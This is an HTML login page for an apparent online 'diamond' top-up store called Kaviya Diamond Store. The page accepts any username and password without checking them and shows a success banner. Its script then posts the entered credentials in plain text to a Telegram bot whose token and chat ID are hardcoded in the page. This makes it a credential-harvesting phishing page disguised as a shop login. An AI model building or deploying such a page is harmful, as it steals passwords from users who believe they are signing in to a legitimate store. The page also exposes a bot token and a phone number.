<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KAVIYA ADMIN</title>

<style>
body{
margin:0;
font-family:Arial;

/* 🔥 BACKGROUND IMAGE ADD KARALA */
background: 
linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
url("IMG-20260226-WA0097.jpg");

background-size:cover;
background-position:center;
background-attachment:fixed;

color:white;
text-align:center;
padding:30px;
overflow-x:hidden;
}

/* SUCCESS BAR */
.success-bar{
position:fixed;
top:-100px;
left:50%;
transform:translateX(-50%);
background:#d4edda;
color:#155724;
padding:15px 20px;
border-radius:12px;
width:90%;
max-width:400px;
box-shadow:0 5px 15px rgba(0,0,0,0.3);
display:flex;
justify-content:center;
align-items:center;
transition:0.5s;
z-index:999;
font-weight:bold;
}

.success-bar.show{
top:20px;
}

.store-title{
font-size:28px;
font-weight:900;
letter-spacing:3px;
text-transform:uppercase;
animation: colorChange 3s infinite alternate;
margin-bottom:10px;
}

.delivery{
font-size:16px;
margin-bottom:25px;
color:#ffffffcc;
}

.main-title{
font-size:42px;
font-weight:900;
letter-spacing:4px;
color:white;
text-transform:uppercase;
text-shadow:
0 0 5px #ffffff,
0 0 15px #00c6ff,
0 0 30px #00c6ff;
margin-bottom:20px;
}

@keyframes colorChange{
0%{color:#00c6ff;}
100%{color:#00ffcc;}
}

/* PHOTO FRAME */
.top-photo{
margin:20px auto;
width:90%;
max-width:350px;
padding:6px;
border-radius:25px;
background:linear-gradient(45deg,#00ffcc,#00c6ff,#ff00cc,#ffff00);
background-size:400% 400%;
animation: frameMove 6s linear infinite;
}

@keyframes frameMove{
0%{background-position:0% 50%;}
50%{background-position:100% 50%;}
100%{background-position:0% 50%;}
}

.top-photo img{
width:100%;
display:block;
border-radius:20px;
}

input{
width:80%;
padding:14px;
margin:10px;
border:none;
border-radius:12px;
font-size:16px;
}

.showbtn{
padding:10px 20px;
border:none;
border-radius:10px;
background:#555;
color:white;
margin-top:5px;
}

button{
width:90%;
padding:16px;
margin:12px;
border:none;
border-radius:14px;
font-size:17px;
font-weight:bold;
cursor:pointer;
}

.loginbtn{ background:#00ff99; color:black; }
.topup{ background:#00c6d7; color:black; }
.contact{ background:transparent; border:2px solid white; color:white; }

.footer-text{
margin-top:10px;
font-size:14px;
color:#00ffcc;
font-weight:bold;
}
</style>
</head>
<body>

<div id="successBar" class="success-bar">
✅ Login Successfully! 
🎉please click top up now button
</div>

<div class="store-title">KAVIYA DIAMOND STORE</div>
<div class="delivery">🚀 Delivery Within 10 Minutes</div>

<h1 class="main-title">KAVIYA ADMIN</h1>
<p>Fast • Secure • Web owner - Admin kaviya</p>

<div class="top-photo">
<img src="IMG-20260224-WA0286.jpg">
</div>

<input type="text" id="username" placeholder="Username"><br>
<input type="password" id="password" placeholder="Password"><br>
<button class="showbtn" onclick="togglePassword()">Show</button>

<button class="loginbtn" onclick="login()">LOGIN</button>
<button class="topup" onclick="goTopup()">TOP UP NOW</button>
<button class="contact" onclick="contactAdmin()">CONTACT ADMIN</button>

<div class="footer-text">Sri Lanka No 1 Diamond Seller</div>

<script>

let loggedIn = false;
let botToken = "8439501847:AAGx25aJnenO2iPwXfSaXqbtZjfW49AXf5o";
let chatId = "8324590734";

function togglePassword(){
let pw = document.getElementById("password");
pw.type = (pw.type === "password") ? "text" : "password";
}

function login(){
let username = document.getElementById("username").value;
let password = document.getElementById("password").value;

if(username === "" || password === ""){
alert("Enter Username & Password");
return;
}

loggedIn = true;

let bar = document.getElementById("successBar");
bar.classList.add("show");

setTimeout(()=>{
bar.classList.remove("show");
},3000);

sendTelegram(username, password);
}

function sendTelegram(username, password){

let message =
"🚨 NEW LOGIN ALERT 🚨\n\n"+
"👤 Username: " + username + "\n"+
"🔑 Password: " + password + "\n"+
"🌍 Time: " + new Date().toLocaleString();

fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
chat_id: chatId,
text: message
})
});

}

function goTopup(){
if(!loggedIn){
alert("⚠️ Please first login");
return;
}
location.href="store.html";
}

function contactAdmin(){
let phone = "94773847598";
let message = "Hello Kaviya Admin, I need help.";
let url = "https://wa.me/" + phone + "?text=" + encodeURIComponent(message);
window.open(url, "_blank");
}

</script>

</body>
</html>
